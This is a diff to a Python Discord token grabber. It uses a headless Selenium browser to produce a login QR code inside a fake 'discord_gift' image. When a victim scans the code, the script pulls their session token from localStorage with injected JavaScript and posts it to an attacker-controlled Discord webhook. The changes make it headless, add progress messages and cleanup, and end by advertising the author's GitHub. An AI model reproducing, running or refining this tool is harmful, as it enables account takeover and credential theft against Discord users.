@@ -9,6 +9,7 @@ from colorama import Fore
 import colorama
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import datetime
+from selenium.webdriver.chrome.service import Service
 
 colorama.init()
 
@@ -25,7 +26,8 @@ print(f"""{Fore.RESET}
  Made By LeRatGondin
 """)
 url = input("\nEntrez l'url du webhook : ")
-
+print(f"{Fore.CYAN}Le qr code est en train d'être généré veuillez attendre{Fore.RESET}")
+print('---')
 try:
     os.remove("discord_gift.png")
     os.remove("temp/final_qr.png")
@@ -35,7 +37,11 @@ except:
 options = webdriver.ChromeOptions()
 options.add_experimental_option('excludeSwitches', ['enable-logging'])
 options.add_experimental_option('detach', True)
-driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')
+options.add_argument('--headless')
+options.add_argument('--disable-gpu')
+options.add_argument("disable-infobars")
+service=Service('chromedriver.exe')
+driver = webdriver.Chrome(service=service, options=options)
 driver.get('https://discord.com/login')
 time.sleep(5)
 
@@ -58,15 +64,16 @@ im1.save('temp/final_qr.png', quality=95)
 im1 = Image.open('temp/template.png', 'r')
 im2 = Image.open('temp/final_qr.png', 'r')
 im1.paste(im2, (121, 389))
-im1.save('discord_gift.png', quality=95)
-os.system('start discord_gift.png')
-
-        
+im1.show()
+#os.system('start discord_gift.png')
+print(f"{Fore.CYAN}Attente de scan{Fore.RESET}")
+print('---')
 while True:
     if "https://discord.com/login" != driver.current_url:
+        print(f"{Fore.CYAN}Le code à été scanné{Fore.RESET}")
+        print('---')
         time.sleep(5)
         token = driver.execute_script('''
-
 window.dispatchEvent(new Event('beforeunload'));
 let iframe = document.createElement('iframe');
 iframe.style.display = 'none';
@@ -75,13 +82,9 @@ let localStorage = iframe.contentWindow.localStorage;
 var token = JSON.parse(localStorage.token);
 return token;
    
-
                     ''')
-        print('---')
         print(f"\n{Fore.WHITE} - TOKEN: {Fore.YELLOW}[Le token est : {token}]")
-
-        message = f'@everyone\n`{token}`'
-
+        print('---')
         w = DiscordWebhook(url=url)
         headers = {
             'Authorization': token,
@@ -113,7 +116,10 @@ return token;
         w.execute()
 
         time.sleep(10)
-        os.remove("discord_gift.png")
         os.remove("temp/final_qr.png")
         os.remove("temp/qr_code.png")
+        os.system('cls')
+        driver.quit()
+        print(f"{Fore.RED}Merci d'avoir utilisé ce script , hesitez pas a aller voir mon github https://github.com/LeRatGondin/{Fore.RESET}")
+        input()
         break
